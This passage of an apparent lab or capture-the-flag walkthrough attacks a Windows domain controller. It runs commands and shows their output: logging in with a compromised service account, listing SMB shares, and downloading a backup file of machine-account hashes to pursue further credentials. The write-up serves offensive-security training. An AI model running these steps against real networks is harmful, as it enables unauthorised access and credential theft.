# We need the capability of this new user.

```sh
nxc smb DC01 -u file_svc -p 'Password123!!' --shares
[*] Initializing SMB protocol database
SMB         10.201.90.139   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.90.139   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.201.90.139   445    DC01             [*] Enumerated shares
SMB         10.201.90.139   445    DC01             Share           Permissions     Remark
SMB         10.201.90.139   445    DC01             -----           -----------     ------
SMB         10.201.90.139   445    DC01             ADMIN$                          Remote Admin
SMB         10.201.90.139   445    DC01             backup          READ            
SMB         10.201.90.139   445    DC01             C$                              Default share
SMB         10.201.90.139   445    DC01             IPC$            READ            Remote IPC
SMB         10.201.90.139   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.201.90.139   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.201.90.139   445    DC01             Users
```

This user has a read permission over the backup shares good.

```sh
┌──(root㉿kali)-[~/ex]
└─# smbclient \\\\DC01\\backup -U file_svc%'Password123!!'                                          
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Fri Jul 25 13:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 10603164 blocks available
smb: \> get backup_extract.txt
getting file \backup_extract.txt of size 892 as backup_extract.txt (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                  
┌──(root㉿kali)-[~/ex]
└─# ls
backup_extract.txt
                                                                                                                                                                                                                  
┌──(root㉿kali)-[~/ex]
└─# cat backup_extract.txt
WebServer$:2119:<SNIP>
```

# Grab fileServer$ hash.
